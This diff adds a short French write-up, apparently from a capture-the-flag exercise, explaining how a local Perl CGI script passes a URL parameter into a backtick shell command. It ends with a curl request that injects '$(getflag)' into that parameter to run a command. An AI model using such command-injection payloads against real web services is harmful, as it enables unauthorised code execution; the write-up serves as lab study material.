@@ -1,0 +1,14 @@
+upload le program level04.pl sur localhost:4747
+curl -i --upload-file 'level04.pl' "localhost:4747"
+
+le program level04.pl prend les param d'une url:
+    use CGI qw{param};
+
+le program prend le param x de l'url:
+    x(param("x"));
+
+et affiche la valeur de l'argument x avec une command bash:
+    print `echo $y 2>&1`;
+
+faire afficher le resultat de la commande getflag
+curl -i localhost:4747?"x=\$(getflag)"
